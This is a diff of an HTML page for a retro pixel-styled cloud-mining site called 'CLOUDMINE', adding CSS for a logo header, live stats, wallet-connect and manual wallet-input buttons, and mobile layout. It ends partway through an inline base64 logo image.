@@ -34,25 +34,319 @@
         }
 
         /* Header */
+        /* Header */
         .header {
-            background: #1976d2;
+            background: linear-gradient(135deg, #1976d2 0%, #1565c0 100%);
             border: 4px solid #0d47a1;
-            padding: 25px;
+            padding: 20px 30px;
             margin-bottom: 30px;
             box-shadow: 8px 8px 0 #0d47a1;
-            text-align: center;
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .hammer-logo {
+            width: 60px;
+            height: 60px;
+            image-rendering: pixelated;
+            image-rendering: -moz-crisp-edges;
+            image-rendering: crisp-edges;
+            filter: drop-shadow(3px 3px 0 rgba(0,0,0,0.3));
+            flex-shrink: 0;
+            background: rgba(255,255,255,0.1);
+            padding: 8px;
+            border-radius: 8px;
+            border: 2px solid rgba(255,255,255,0.2);
+        }
+
+        .header-text {
+            text-align: left;
+            flex: 1;
         }
 
         .logo {
-            font-size: 32px;
+            font-size: 28px;
             color: white;
-            margin-bottom: 12px;
-            text-shadow: 4px 4px 0 #0d47a1;
+            margin-bottom: 6px;
+            text-shadow: 3px 3px 0 #0d47a1;
+            line-height: 1;
+            letter-spacing: 2px;
         }
 
         .tagline {
+            font-size: 9px;
+            color: #e3f2fd;
+            letter-spacing: 1px;
+            opacity: 0.95;
+        }
+
+        /* Live Stats */
+        .live-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .stat-item {
+            background: rgba(25, 118, 210, 0.1);
+            border: 2px solid #1976d2;
+            padding: 10px;
+            text-align: center;
+            border-radius: 4px;
+        }
+
+        .stat-value {
+            font-size: 14px;
+            color: #4caf50;
+            margin-bottom: 4px;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 6px;
+            color: #1976d2;
+            letter-spacing: 0.5px;
+        }
+
+        /* Main Action Buttons (Always Visible) */
+        .main-action-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 35px;
+        }
+
+        .main-action-btn {
+            background: white;
+            border: 4px solid;
+            padding: 35px 25px;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 6px 6px 0;
+            transition: all 0.1s;
+            font-family: 'Press Start 2P', cursive;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .main-action-btn:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 8px 8px 0;
+        }
+
+        .main-action-btn:active {
+            transform: translate(2px, 2px);
+            box-shadow: 3px 3px 0;
+        }
+
+        .btn-connect-main {
+            border-color: #4caf50;
+            box-shadow: 6px 6px 0 #4caf50;
+        }
+
+        .btn-connect-main:hover {
+            background: #e8f5e9;
+            box-shadow: 8px 8px 0 #4caf50;
+        }
+
+        .btn-connect-main:active {
+            box-shadow: 3px 3px 0 #4caf50;
+        }
+
+        .btn-manual-main {
+            border-color: #ff9800;
+            box-shadow: 6px 6px 0 #ff9800;
+        }
+
+        .btn-manual-main:hover {
+            background: #fff3e0;
+            box-shadow: 8px 8px 0 #ff9800;
+        }
+
+        .btn-manual-main:active {
+            box-shadow: 3px 3px 0 #ff9800;
+        }
+
+        .main-icon {
+            font-size: 42px;
+            margin-bottom: 15px;
+        }
+
+        .main-title {
+            font-size: 13px;
+            color: #0d47a1;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
+        }
+
+        .main-subtitle {
+            font-size: 7px;
+            color: #1976d2;
+            line-height: 1.6;
+        }
+
+        @media (hover: none) {
+            .main-action-btn:hover {
+                transform: none;
+                background: white;
+            }
+        }
+
+        /* Action Buttons */
+        .main-wallet-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .main-wallet-btn {
+            background: linear-gradient(135deg, #2196f3 0%, #1976d2 100%);
+            border: 4px solid #0d47a1;
+            padding: 30px 20px;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 6px 6px 0 #0d47a1;
+            transition: all 0.1s;
+            font-family: 'Press Start 2P', cursive;
+            color: white;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .main-wallet-btn:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 8px 8px 0 #0d47a1;
+        }
+
+        .main-wallet-btn:active {
+            transform: translate(2px, 2px);
+            box-shadow: 3px 3px 0 #0d47a1;
+        }
+
+        .btn-connect {
+            background: linear-gradient(135deg, #4caf50 0%, #388e3c 100%);
+            border-color: #2e7d32;
+            box-shadow: 6px 6px 0 #2e7d32;
+        }
+
+        .btn-connect:hover {
+            box-shadow: 8px 8px 0 #2e7d32;
+        }
+
+        .btn-connect:active {
+            box-shadow: 3px 3px 0 #2e7d32;
+        }
+
+        .btn-manual {
+            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
+            border-color: #e65100;
+            box-shadow: 6px 6px 0 #e65100;
+        }
+
+        .btn-manual:hover {
+            box-shadow: 8px 8px 0 #e65100;
+        }
+
+        .btn-manual:active {
+            box-shadow: 3px 3px 0 #e65100;
+        }
+
+        .btn-icon {
+            font-size: 36px;
+            margin-bottom: 12px;
+        }
+
+        .btn-title {
+            font-size: 12px;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
+        }
+
+        .btn-desc {
+            font-size: 7px;
+            color: rgba(255,255,255,0.9);
+            line-height: 1.5;
+        }
+
+        @media (hover: none) {
+            .main-wallet-btn:hover {
+                transform: none;
+                box-shadow: 6px 6px 0;
+            }
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .btn-action {
+            padding: 20px 15px;
+            border: 4px solid;
+            font-family: 'Press Start 2P', cursive;
             font-size: 10px;
-            color: #bbdefb;
+            cursor: pointer;
+            box-shadow: 4px 4px 0;
+            transition: all 0.1s;
+            text-align: center;
+            line-height: 1.6;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .btn-primary {
+            background: #2196f3;
+            border-color: #0d47a1;
+            box-shadow: 4px 4px 0 #0d47a1;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 6px 6px 0 #0d47a1;
+        }
+
+        .btn-primary:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0 #0d47a1;
+        }
+
+        .btn-secondary {
+            background: #4caf50;
+            border-color: #2e7d32;
+            box-shadow: 4px 4px 0 #2e7d32;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 6px 6px 0 #2e7d32;
+        }
+
+        .btn-secondary:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0 #2e7d32;
+        }
+
+        @media (hover: none) {
+            .btn-action:hover {
+                transform: none;
+                box-shadow: 4px 4px 0;
+            }
         }
 
         /* Info Section */
@@ -167,6 +461,204 @@
             display: grid;
             grid-template-columns: repeat(6, 1fr);
             gap: 15px;
+        }
+
+        /* Wallet Action Section (after coin selection) */
+        .wallet-action-section {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 3px dashed #1976d2;
+        }
+
+        .action-divider {
+            text-align: center;
+            font-size: 11px;
+            color: #1976d2;
+            margin-bottom: 25px;
+            padding: 12px;
+            background: rgba(25, 118, 210, 0.1);
+            border: 2px solid #1976d2;
+            letter-spacing: 2px;
+        }
+
+        .wallet-action-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+
+        .wallet-action-btn {
+            background: white;
+            border: 4px solid;
+            padding: 35px 25px;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 6px 6px 0;
+            transition: all 0.1s;
+            font-family: 'Press Start 2P', cursive;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .wallet-action-btn:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 8px 8px 0;
+        }
+
+        .wallet-action-btn:active {
+            transform: translate(2px, 2px);
+            box-shadow: 3px 3px 0;
+        }
+
+        .btn-connect-action {
+            border-color: #4caf50;
+            box-shadow: 6px 6px 0 #4caf50;
+        }
+
+        .btn-connect-action:hover {
+            background: #e8f5e9;
+            box-shadow: 8px 8px 0 #4caf50;
+        }
+
+        .btn-connect-action:active {
+            box-shadow: 3px 3px 0 #4caf50;
+        }
+
+        .btn-manual-action {
+            border-color: #ff9800;
+            box-shadow: 6px 6px 0 #ff9800;
+        }
+
+        .btn-manual-action:hover {
+            background: #fff3e0;
+            box-shadow: 8px 8px 0 #ff9800;
+        }
+
+        .btn-manual-action:active {
+            box-shadow: 3px 3px 0 #ff9800;
+        }
+
+        .action-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .action-title {
+            font-size: 13px;
+            color: #0d47a1;
+            margin-bottom: 10px;
+            text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
+        }
+
+        .action-subtitle {
+            font-size: 7px;
+            color: #1976d2;
+            line-height: 1.6;
+        }
+
+        @media (hover: none) {
+            .wallet-action-btn:hover {
+                transform: none;
+                background: white;
+            }
+        }
+
+        /* Wallet Connect Section */
+        .wallet-connect-section {
+            margin-top: 40px;
+            padding: 30px;
+            background: white;
+            border: 4px solid #1976d2;
+            box-shadow: 6px 6px 0 #1976d2;
+        }
+
+        .connect-title {
+            font-size: 12px;
+            color: #0d47a1;
+            text-align: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 3px dashed #1976d2;
+        }
+
+        .wallet-connect-buttons {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+
+        .wallet-connect-btn {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border: 4px solid #1976d2;
+            padding: 25px 20px;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 4px 4px 0 #1976d2;
+            transition: all 0.1s;
+            font-family: 'Press Start 2P', cursive;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+
+        .wallet-connect-btn:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 6px 6px 0 #1976d2;
+        }
+
+        .wallet-connect-btn:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0 #1976d2;
+        }
+
+        .wallet-metamask {
+            border-color: #f6851b;
+            box-shadow: 4px 4px 0 #f6851b;
+        }
+
+        .wallet-metamask:hover {
+            box-shadow: 6px 6px 0 #f6851b;
+        }
+
+        .wallet-metamask:active {
+            box-shadow: 2px 2px 0 #f6851b;
+        }
+
+        .wallet-input {
+            border-color: #4caf50;
+            box-shadow: 4px 4px 0 #4caf50;
+        }
+
+        .wallet-input:hover {
+            box-shadow: 6px 6px 0 #4caf50;
+        }
+
+        .wallet-input:active {
+            box-shadow: 2px 2px 0 #4caf50;
+        }
+
+        .wallet-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+
+        .wallet-name {
+            font-size: 11px;
+            color: #0d47a1;
+            margin-bottom: 8px;
+        }
+
+        .wallet-desc {
+            font-size: 7px;
+            color: #1976d2;
+        }
+
+        @media (hover: none) {
+            .wallet-connect-btn:hover {
+                transform: none;
+                box-shadow: 4px 4px 0;
+            }
         }
 
         .coin-select {
@@ -546,14 +1038,182 @@
                 margin-bottom: 20px;
             }
 
+            .header-content {
+                gap: 12px;
+            }
+
+            .hammer-logo {
+                width: 50px;
+                height: 50px;
+                padding: 6px;
+            }
+
             .logo {
-                font-size: 18px;
-                text-shadow: 3px 3px 0 #0d47a1;
+                font-size: 20px;
+                text-shadow: 2px 2px 0 #0d47a1;
+                letter-spacing: 1px;
             }
 
             .tagline {
                 font-size: 7px;
-                margin-top: 8px;
+            }
+
+            .live-stats {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 8px;
+                margin-bottom: 20px;
+            }
+
+            .main-action-buttons {
+                grid-template-columns: 1fr;
+                gap: 15px;
+                margin-bottom: 25px;
+            }
+
+            .main-action-btn {
+                padding: 28px 20px;
+                border: 3px solid;
+                box-shadow: 4px 4px 0;
+            }
+
+            .main-action-btn:hover {
+                box-shadow: 4px 4px 0;
+            }
+
+            .main-icon {
+                font-size: 38px;
+                margin-bottom: 12px;
+            }
+
+            .main-title {
+                font-size: 11px;
+                margin-bottom: 8px;
+            }
+
+            .main-subtitle {
+                font-size: 6px;
+            }
+
+            .wallet-action-section {
+                margin-top: 30px;
+                padding-top: 25px;
+            }
+
+            .action-divider {
+                font-size: 9px;
+                padding: 10px;
+                margin-bottom: 20px;
+            }
+
+            .wallet-action-buttons {
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+
+            .wallet-action-btn {
+                padding: 25px 20px;
+                border: 3px solid;
+                box-shadow: 4px 4px 0;
+            }
+
+            .wallet-action-btn:hover {
+                box-shadow: 4px 4px 0;
+            }
+
+            .action-icon {
+                font-size: 36px;
+                margin-bottom: 12px;
+            }
+
+            .action-title {
+                font-size: 11px;
+                margin-bottom: 8px;
+            }
+
+            .action-subtitle {
+                font-size: 6px;
+            }
+
+            .stat-item {
+                padding: 8px 5px;
+                border: 2px solid #1976d2;
+            }
+
+            .stat-value {
+                font-size: 11px;
+            }
+
+            .stat-label {
+                font-size: 5px;
+            }
+
+            .wallet-connect-section {
+                margin-top: 25px;
+                padding: 20px 15px;
+                border: 3px solid #1976d2;
+                box-shadow: 4px 4px 0 #1976d2;
+            }
+
+            .connect-title {
+                font-size: 9px;
+                margin-bottom: 20px;
+                padding-bottom: 12px;
+                border-bottom: 2px dashed #1976d2;
+            }
+
+            .wallet-connect-buttons {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .wallet-connect-btn {
+                padding: 20px 15px;
+                border: 3px solid;
+                box-shadow: 3px 3px 0;
+            }
+
+            .wallet-connect-btn:hover {
+                box-shadow: 3px 3px 0;
+            }
+
+            .wallet-icon {
+                font-size: 28px;
+                margin-bottom: 10px;
+            }
+
+            .wallet-name {
+                font-size: 9px;
+                margin-bottom: 6px;
+            }
+
+            .wallet-desc {
+                font-size: 6px;
+            }
+
+            .action-buttons {
+                grid-template-columns: 1fr;
+                gap: 12px;
+                margin-bottom: 20px;
+            }
+
+            .btn-action {
+                padding: 15px 12px;
+                font-size: 8px;
+                border: 3px solid;
+                box-shadow: 3px 3px 0;
+            }
+
+            .btn-primary:hover,
+            .btn-secondary:hover {
+                box-shadow: 3px 3px 0;
+            }
+
+            .btn-primary:active {
+                box-shadow: 2px 2px 0 #0d47a1;
+            }
+
+            .btn-secondary:active {
+                box-shadow: 2px 2px 0 #2e7d32;
             }
 
             .coins-grid {
@@ -648,6 +1308,33 @@
                 padding: 12px;
                 font-size: 9px;
                 border: 3px solid #1976d2;
+            }
+
+            .wallet-options {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+
+            .wallet-btn {
+                padding: 15px;
+                font-size: 8px;
+                border: 3px solid;
+                box-shadow: 3px 3px 0;
+            }
+
+            .wallet-connect:hover,
+            .wallet-manual:hover {
+                box-shadow: 3px 3px 0;
+            }
+
+            .wallet-or {
+                font-size: 9px;
+                padding: 5px 0;
+            }
+
+            .manual-input-container {
+                padding: 15px;
+                border: 2px dashed #1976d2;
             }
 
             .btn {
@@ -1056,6 +1743,80 @@
             margin-bottom: 25px;
         }
 
+        .wallet-options {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 15px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .wallet-btn {
+            padding: 18px 20px;
+            border: 4px solid;
+            font-family: 'Press Start 2P', cursive;
+            font-size: 9px;
+            cursor: pointer;
+            box-shadow: 4px 4px 0;
+            transition: all 0.1s;
+            text-align: center;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+            background: white;
+            color: #0d47a1;
+        }
+
+        .wallet-connect {
+            border-color: #2196f3;
+            box-shadow: 4px 4px 0 #2196f3;
+        }
+
+        .wallet-connect:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 6px 6px 0 #2196f3;
+        }
+
+        .wallet-connect:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0 #2196f3;
+        }
+
+        .wallet-manual {
+            border-color: #4caf50;
+            box-shadow: 4px 4px 0 #4caf50;
+        }
+
+        .wallet-manual:hover {
+            transform: translate(-2px, -2px);
+            box-shadow: 6px 6px 0 #4caf50;
+        }
+
+        .wallet-manual:active {
+            transform: translate(2px, 2px);
+            box-shadow: 2px 2px 0 #4caf50;
+        }
+
+        @media (hover: none) {
+            .wallet-btn:hover {
+                transform: none;
+            }
+        }
+
+        .wallet-or {
+            font-size: 10px;
+            color: #1976d2;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .manual-input-container {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f5f5f5;
+            border: 3px dashed #1976d2;
+        }
+
         .wallet-input-field {
             width: 100%;
             background: white;
@@ -1122,8 +1883,42 @@
     <div class="container">
         <!-- Header -->
         <div class="header">
-            <div class="logo">⛏️ CLOUDMINE</div>
+            <div class="logo-8bit">
+                <img src="data:image/webp;base64,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